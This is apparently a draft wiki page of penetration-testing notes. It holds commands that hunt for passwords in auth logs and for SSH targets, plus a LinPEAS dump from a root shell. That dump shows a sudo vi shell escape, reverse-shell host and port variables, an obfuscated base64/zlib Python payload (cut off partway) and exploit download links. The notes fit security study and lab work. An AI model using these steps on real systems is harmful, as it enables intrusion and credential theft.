---
hidden: true
---

# A

## To add in wiki

```bash
#  find db in linux machine 
ps aux
ps aux | grep db
ps aux | grep 
```

```bash
# find other IP into log files
cd /var/log
grep -rEo '([0-9]{1,3}\.){3}[0-9]{1,3}' . | sort | uniq

# find password into log
cat /var/log/auth* | grep -i --text "pass"

# Check if the user connected out to another machine:
cat ~/.ssh/known_hosts
cat ~/.ssh/config
cat ~/.bash_history | grep ssh

# This might reveal other machines the current host connects to:
netstat -tunp
ss -tunap

# Applications might be configured to connect to internal servers:
grep -rEo '([0-9]{1,3}\.){3}[0-9]{1,3}' /etc/*


```



<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>





<details>

<summary>Linpeas output</summary>

```


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |                                                                                                                                                     
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          LinPEAS-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 6.8.0-60-generic (buildd@lcy02-amd64-054) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #63-Ubuntu SMP PREEMPT_DYNAMIC Tue Apr 15 19:04:15 UTC 2025
User & Groups: uid=0(root) gid=0(root) groups=0(root)
Hostname: app-server

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                     
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                                                                          
                                                                                                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                                                                                           
Linux version 6.8.0-60-generic (buildd@lcy02-amd64-054) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #63-Ubuntu SMP PREEMPT_DYNAMIC Tue Apr 15 19:04:15 UTC 2025                  
Distributor ID: Ubuntu
Description:    Ubuntu 24.04.2 LTS
Release:        24.04
Codename:       noble

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                                                                                              
Sudo version 1.9.15p5                                                                                                                                                                                                                       


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                                                                                      
                                                                                                                                                                                                                                            
╔══════════╣ Date & uptime
Sat Jul 19 09:13:16 AM UTC 2025                                                                                                                                                                                                             
 09:13:16 up 16:22,  2 users,  load average: 0.34, 0.08, 0.03

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
/dev/disk/by-id/dm-uuid-LVM-1ukJFUkRGmwCnbqtXz6R60rZd5i19nnZckbmPgGFqYCmiieFPXVrKTQlWRW77YRx / ext4 defaults 0 1                                                                                                                            
/dev/disk/by-uuid/92c136ba-6589-4780-b944-3cffb6d36bca /boot ext4 defaults 0 1
/dev/disk/by-uuid/C5A3-52A5 /boot/efi vfat defaults 0 1
/swap.img       none    swap    sw      0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        
sda
sda1
sda2
sda3

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
SUDO_GID=1000                                                                                                                                                                                                                               
LESSOPEN=| /usr/bin/lesspipe %s
MAIL=/var/mail/root
USER=root
RPORT=9009
SHLVL=2
HOME=/root
OLDPWD=/
VIM=/usr/share/vim
SUDO_UID=1000
LOGNAME=root
VIMRUNTIME=/usr/share/vim/vim91
_=./linpeas.sh
TERM=xterm-256color
LANG=en_US.UTF-8
SUDO_COMMAND=/usr/bin/vi -c :!/bin/sh /dev/null
SHELL=/usr/bin/bash
SUDO_USER=app-admin
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
RHOST=192.168.90.84

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                                                                                       
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
cat: write error: Broken pipe                                                                                                                                                                                                               
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Protections
═╣ AppArmor enabled? .............. apparmor module is loaded.                                                                                                                                                                              
120 profiles are loaded.
25 profiles are in enforce mode.
   /usr/bin/man
   /usr/lib/snapd/snap-confine
   /usr/lib/snapd/snap-confine//mount-namespace-capture-helper
   docker-default
   lsb_release
   man_filter
   man_groff
   nvidia_modprobe
   nvidia_modprobe//kmod
   plasmashell
   plasmashell//QtWebEngineProcess
   rsyslogd
   tcpdump
   ubuntu_pro_apt_news
   ubuntu_pro_esm_cache
   ubuntu_pro_esm_cache//apt_methods
   ubuntu_pro_esm_cache//apt_methods_gpgv
   ubuntu_pro_esm_cache//cloud_id
   ubuntu_pro_esm_cache//dpkg
   ubuntu_pro_esm_cache//ps
   ubuntu_pro_esm_cache//ubuntu_distro_info
   ubuntu_pro_esm_cache_systemctl
   ubuntu_pro_esm_cache_systemd_detect_virt
   unix-chkpwd
   unprivileged_userns
4 profiles are in complain mode.
   transmission-cli
   transmission-daemon
   transmission-gtk
   transmission-qt
0 profiles are in prompt mode.
0 profiles are in kill mode.
91 profiles are in unconfined mode.
   1password
   Discord
   MongoDB Compass
   QtWebEngineProcess
   balena-etcher
   brave
   buildah
   busybox
   cam
   ch-checkns
   ch-run
   chrome
   crun
   devhelp
   element-desktop
   epiphany
   evolution
   firefox
   flatpak
   foliate
   geary
   github-desktop
   goldendict
   ipa_verify
   kchmviewer
   keybase
   lc-compliance
   libcamerify
   linux-sandbox
   loupe
   lxc-attach
   lxc-create
   lxc-destroy
   lxc-execute
   lxc-stop
   lxc-unshare
   lxc-usernsexec
   mmdebstrap
   msedge
   nautilus
   notepadqq
   obsidian
   opam
   opera
   pageedit
   podman
   polypane
   privacybrowser
   qcam
   qmapshack
   qutebrowser
   rootlesskit
   rpm
   rssguard
   runc
   sbuild
   sbuild-abort
   sbuild-adduser
   sbuild-apt
   sbuild-checkpackages
   sbuild-clean
   sbuild-createchroot
   sbuild-destroychroot
   sbuild-distupgrade
   sbuild-hold
   sbuild-shell
   sbuild-unhold
   sbuild-update
   sbuild-upgrade
   scide
   signal-desktop
   slack
   slirp4netns
   steam
   stress-ng
   surfshark
   systemd-coredump
   thunderbird
   toybox
   trinity
   tup
   tuxedo-control-center
   userbindmount
   uwsgi-core
   vdens
   virtiofsd
   vivaldi-bin
   vpnns
   vscode
   wike
   wpcom
3 processes have profiles defined.
3 processes are in enforce mode.
   /usr/local/bin/node (5138) docker-default
   /usr/local/bin/python3.9 (5260) docker-default
   /usr/sbin/rsyslogd (963) rsyslogd
0 processes are in complain mode.
0 processes are in prompt mode.
0 processes are in kill mode.
0 processes are unconfined but have a profile defined.
0 processes are in mixed mode.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                                                                    
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                                                                            

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
══╣ Kernel modules loadable? 
Modules can be loaded                                                                                                                                                                                                                       



                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present (if any):
/usr/bin/docker                                                                                                                                                                                                                             
/usr/sbin/lxc
/usr/sbin/runc
/usr/bin/ctr
/usr/bin/containerd
/usr/bin/docker-proxy
/usr/sbin/apparmor_parser
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap

╔══════════╣ Container details
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Docker version ............... Client:                                                                                                                                                                                                   
 Version:           26.1.3
 API version:       1.45
 Go version:        go1.22.2
 Git commit:        26.1.3-0ubuntu1~24.04.1
 Built:             Mon Oct 14 14:29:26 2024
 OS/Arch:           linux/amd64
 Context:           default

Server:
 Engine:
  Version:          26.1.3
  API version:      1.45 (minimum version 1.24)
  Go version:       go1.22.2
  Git commit:       26.1.3-0ubuntu1~24.04.1
  Built:            Mon Oct 14 14:29:26 2024
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.7.24
  GitCommit:        
 runc:
  Version:          1.1.12-0ubuntu3.1
  GitCommit:        
 docker-init:
  Version:          0.19.0
  GitCommit:        
═╣ Docker info ................. Client:
 Version:    26.1.3
 Context:    default
 Debug Mode: false

Server:
 Containers: 28
  Running: 3
  Paused: 0
  Stopped: 25
 Images: 21
 Server Version: 26.1.3
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Using metacopy: false
  Native Overlay Diff: true
  userxattr: false
 Logging Driver: json-file
 Cgroup Driver: systemd
 Cgroup Version: 2
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local splunk syslog
 Swarm: inactive
 Runtimes: io.containerd.runc.v2 runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 
 runc version: 
 init version: 
 Security Options:
  apparmor
  seccomp
   Profile: builtin
  cgroupns
 Kernel Version: 6.8.0-60-generic
 Operating System: Ubuntu 24.04.2 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 4
 Total Memory: 3.777GiB
 Name: app-server
 ID: ed7efb85-b277-49dc-a9df-802147c8c413
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false

═╣ LXC version ................ Installing LXD snap, please be patient.

lxc Not Found
═╣ LXC info ................... Installing LXD snap, please be patient.                                                                                                                                                                     

lxc Not Found
═╣ Any running containers? ........                                                                                                                                                                                                         



Yes docker(2) lxc(1) 
Running Docker Containers
CONTAINER ID   IMAGE             COMMAND                   CREATED        STATUS                      PORTS                                           NAMES
ba2e8eee8c90   code              "python3 code.py"         7 weeks ago    Up 7 weeks                  0.0.0.0:23100->23100/tcp, :::23100->23100/tcp   code-testx
d479c6a3d980   my-hothost:leak   "node src/index.js"       7 weeks ago    Up 7 weeks                  0.0.0.0:8091->8091/tcp, :::8091->8091/tcp       hot_1
dcbd090cb235   code              "python3 code.py"         2 months ago   Exited (137) 7 weeks ago                                                    code-test8
c1afed8135b1   code              "python3 code.py"         2 months ago   Exited (255) 2 months ago   0.0.0.0:23100->23100/tcp, :::23100->23100/tcp   code-test11
71d3c4d534f9   code              "python3 code.py"         2 months ago   Exited (137) 2 months ago                                                   code-test10
49792c71b3c1   my-hothost:leak   "node src/index.js"       2 months ago   Exited (137) 7 weeks ago                                                    hot
54e94a452c28   47e0e55f2d48      "node src/index.js"       2 months ago   Exited (137) 2 months ago                                                   hot1host-web1
cbfc88df578e   95f80ec60c06      "node src/index.js"       2 months ago   Exited (137) 2 months ago                                                   hothost-web1
8c9b9fc8a67d   f4f0580887b2      "node src/index.js"       2 months ago   Exited (137) 7 weeks ago                                                    hothost-web
63f2da1bcfd6   f4f0580887b2      "node src/index.js"       2 months ago   Exited (1) 2 months ago                                                     suspicious_ptolemy
dbfe85340aa8   8ced2d0b80b5      "python3 code.py"         2 months ago   Exited (137) 2 months ago                                                   co1de-test
0a4b1f1e4b7e   8ced2d0b80b5      "python3 code.py"         2 months ago   Exited (137) 2 months ago                                                   code-apple
8b9b91719703   ebe56dc4be06      "python3 code.py"         2 months ago   Exited (137) 2 months ago                                                   code-container
c99628067a55   10c386f9f779      "python3 code.py"         2 months ago   Exited (137) 2 months ago                                                   c12
c0385e7eba24   10c386f9f779      "python3 code.py"         2 months ago   Exited (137) 2 months ago                                                   c1
a5eaa13ef93b   69cf2895734c      "python3 code.py"         2 months ago   Exited (137) 2 months ago                                                   code-test1
2dbbb8977077   ed2543229f51      "python3 code.py"         2 months ago   Exited (137) 2 months ago                                                   code-test
9c17693bfbc8   60aae044ebb0      "/bin/sh -c 'sh -c \"…"   2 months ago   Exited (137) 2 months ago                                                   focused_keller
2e1b51084971   60aae044ebb0      "/bin/sh -c 'sh -c \"…"   2 months ago   Exited (255) 2 months ago                                                   wonderful_hugle
289cd7f9c62f   278892ab3f57      "node src/index.js"       2 months ago   Exited (255) 2 months ago   0.0.0.0:8091->8091/tcp, :::8091->8091/tcp       web3
1966cbf6f0e9   fb77885801d3      "node src/index.js"       2 months ago   Exited (255) 7 weeks ago    0.0.0.0:8091->8091/tcp, :::8091->8091/tcp       web2
0e14fdd01284   bc817e9f85b7      "sh"                      2 months ago   Exited (0) 2 months ago                                                     kind_sanderson
9fe9c120f695   bc817e9f85b7      "node src/index.js"       2 months ago   Exited (137) 2 months ago                                                   web1
80a14ab1994f   e1fcbcebf122      "node src/index.js"       2 months ago   Exited (137) 2 months ago                                                   web
efd661f35cd3   e1fcbcebf122      "node src/index.js"       2 months ago   Exited (1) 2 months ago                                                     loving_wescoff
51e051aedd24   e1fcbcebf122      "."                       2 months ago   Created                                                                     nervous_mcnulty
44071ad36b49   e1fcbcebf122      "node src/index.js"       2 months ago   Exited (1) 2 months ago                                                     heuristic_chatelet
00f1dd456da6   74cc54e27dc4      "/hello"                  2 months ago   Exited (0) 2 months ago                                                     kind_robinson

Running LXC Containers
Installing LXD snap, please be patient.




                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
                                                                                                                                                                                                                                            
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                 
root           1  0.0  0.3  22380 13224 ?        Ss   Jul18   0:04 /sbin/init                                                                                                                                                               
root         371  0.0  0.4  66928 19264 ?        S<s  Jul18   0:04 /usr/lib/systemd/systemd-journald
root         407  0.0  0.6 354636 27264 ?        SLsl Jul18   0:03 /sbin/multipathd -d -s
root         442  0.0  0.2  30776  9472 ?        Ss   Jul18   0:00 /usr/lib/systemd/systemd-udevd
systemd+     585  0.0  0.2  22012  9728 ?        Ss   Jul18   0:00 /usr/lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+     615  0.0  0.3  22240 13312 ?        Ss   Jul18   0:03 /usr/lib/systemd/systemd-resolved
  └─(Caps) 0x0000000000002000=cap_net_raw
systemd+     631  0.0  0.1  91020  7808 ?        Ssl  Jul18   0:02 /usr/lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         751  0.0  0.2  53464 11776 ?        Ss   Jul18   0:00 /usr/bin/VGAuthService
root         756  0.0  0.2 316232  9472 ?        Ssl  Jul18   0:35 /usr/bin/vmtoolsd
message+     844  0.0  0.1   9984  5376 ?        Ss   Jul18   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
polkitd      857  0.0  0.1 308164  7680 ?        Ssl  Jul18   0:00 /usr/lib/polkit-1/polkitd --no-debug
root         904  0.0  0.2  18088  9112 ?        Ss   Jul18   0:00 /usr/lib/systemd/systemd-logind
root         911  0.0  0.3 468988 13056 ?        Ssl  Jul18   0:01 /usr/libexec/udisks2/udisksd
root         952  0.0  1.2 1875156 48948 ?       Ssl  Jul18   0:35 /usr/bin/containerd
root         956  0.0  0.5 109676 22784 ?        Ssl  Jul18   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
syslog       963  0.0  0.1 222508  5760 ?        Ssl  Jul18   0:00 /usr/sbin/rsyslogd -n -iNONE
root        1004  0.0  0.3 392028 12160 ?        Ssl  Jul18   0:00 /usr/sbin/ModemManager
root        1193  0.0  2.1 2357776 86940 ?       Ssl  Jul18   0:11 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        5083  0.0  0.1 1744824 4096 ?        Sl   07:18   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8091 -container-ip 172.17.0.2 -container-port 8091
root        5092  0.0  0.1 1671348 3968 ?        Sl   07:18   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8091 -container-ip 172.17.0.2 -container-port 8091
root        5215  0.0  0.1 1745080 3968 ?        Sl   07:19   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 23100 -container-ip 172.17.0.3 -container-port 23100
root        5221  0.0  0.1 1744824 4096 ?        Sl   07:19   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 23100 -container-ip 172.17.0.3 -container-port 23100
root        1195  0.0  0.0   6824  2688 ?        Ss   Jul18   0:00 /usr/sbin/cron -f -P
root        1231  0.0  0.1   6980  4608 tty1     Ss   Jul18   0:00 /bin/login -p --
app-adm+    1859  0.0  0.1   8656  5376 tty1     S    Jul18   0:00  _ -bash
root        5292  0.0  0.1   9776  4768 tty1     S    07:19   0:00      _ su -
root        5293  0.0  0.1   8652  5376 tty1     S+   07:19   0:00          _ -bash
app-adm+    1846  0.0  0.2  20288 11392 ?        Ss   Jul18   0:00 /usr/lib/systemd/systemd --user
  └─(Caps) 0x0000000800000000=cap_wake_alarm
app-adm+    1848  0.0  0.0  21144  3516 ?        S    Jul18   0:00  _ (sd-pam)
root        2324  0.0  0.2 313828  8704 ?        Ssl  Jul18   0:00 /usr/libexec/upowerd
root        5118  0.0  0.3 1238228 14096 ?       Sl   07:18   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id d479c6a3d9803f4dd463ebf3a27593caac723bea0c05b433914f5b955ff394fd -address /run/containerd/containerd.sock
root        5138  2.5  2.7 10841380 107856 ?     Ssl  07:18   3:07  _ node src/index.js
root        5239  0.0  0.3 1238228 14128 ?       Sl   07:19   0:02 /usr/bin/containerd-shim-runc-v2 -namespace moby -id ba2e8eee8c90b4075c8d5dea7d9fcdc05b457183e1af6591ef4abfb2faa514a8 -address /run/containerd/containerd.sock
root        5260  0.5  0.8 725080 33468 ?        Ss   07:19   0:42  _ python3 code.py
app-adm+   52650  0.0  0.1  14964  6832 ?        S    08:56   0:00      _ sshd: app-admin@pts/0
app-adm+   52684  0.0  0.1   8780  5504 pts/0    Ss   08:56   0:00          _ -bash
root       52802  0.0  0.1  16736  7040 pts/0    S+   09:07   0:00              _ sudo vi -c :!/bin/sh /dev/null
root       52803  0.0  0.0  16736  2476 pts/1    Ss   09:07   0:00                  _ sudo vi -c :!/bin/sh /dev/null
root       52804  0.1  0.3  24544 13184 pts/1    S    09:07   0:01                      _ vi -c :!/bin/sh /dev/null
root       52805  0.0  0.0   2800  1664 pts/1    S    09:07   0:00                          _ /bin/sh
root       52860  0.0  0.1   7728  4352 pts/2    Ss   09:11   0:00                                  _ /bin/bash
root       52886  0.0  0.3 241352 12928 pts/2    S+   09:11   0:00                                      _ /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("eNqVWW1v40YO/iz9ilnvh0i3WuVli8PBqA9oEqcx1o3b2Iu7Ng0ERR7bQmTJlcabpLgff+S8jyQnu/5gSxwOh3zIITnjfLurakaqxs/FU/OiH3fsRVM3BX1WL6usZIUeYfU+Y/otX5epHmO03uZGNNvUNF3m5dpf1dWWNLSgGSNqJn/zhYBY/ATybT75eXKziIh5TS6vpuFB5t++THq4/XyF1sVfad3kVZnk5aq6O7knoxE5G/qe1OO3Pd1TkjbkL3zwadFQMyhorH4xpLzyvYf9akXrrEibhoyAEp+/MNpMZj59zuiOGeY5q8F8GGhNUfRYM/jz6/F0CkOD431THz/k5fFD2mwG/s14kZx/uUrmkz/GMHz6z0//+sEXcn6hTUPLNa1hQTX91Pdux5L3zPfG/x1fwNMnYFjcjn/6BZ5/8NVLcjG7RL6jd9dHmnb++2I8B6Lwc5ylRdbkf9PAmgLQetPxjZ6OsxOb8O6IfBBkpB6SqGaguMXvv4719HOU51CEQKRz8iGJeg6KvB7/dDm+dUVoJT8QzQusS7oiCcRHzpIkgMBcRcTyVwjwekiNC1qCqJuqpIqSl7s9SwQzDFmzgtCatWabN5i24Mt0TQ9xCR0lU5Cwlx2NSLJMWcq1qynb16XCY5dmj4EOjtgCIiKgTCDmAQaGx8AKYlE6DnM+35OrcrxTlmdbyjbVMpBkpduK0qXETqvVgSh+qnNGA87QO95Q+hicoEzvaZMXlCzqPe5Hz4PNXFY8bXBEOc2Dh6SEhUE3Y4uJuY+k64CY0aLguHse6oFmddTAvBUo4YK3R5JrDFcR4RXovhsRJUDo6j2A1EffEWZieF+2vKY3VNRnxJqyr2mxp0EYQko7pKBC88AwrFxmKZjAOWTmk7AoWLWmEks3Tr8dTC3T0qYl6y04tYgDeLbE2cbzkH4NbJ0Nol4zuQl9u8XAn1jb5JCEsON9mUvetqAXfMd/3ktOiyVRuUHy+q9us74xS6qsM1CkaLod9ubJJF/CVwOLQYkdoTnWzscAAgb1niAIEuCEexvGqybe5TtqMiEfAF1amRbzSyI6itaIXBzXko9oNBZ/ezRv+CQeO2adFdgKE4t0+7BMeYQNSU2bXVWKZIY2fCA6JrOios80CywTeuioI5L1jnp9PVtN+C3tSFMZ31BEHZYoGu1CXcaKZpOvjIN0MrYTqMK4pZ1AnTc9Me+Lul6JIVL0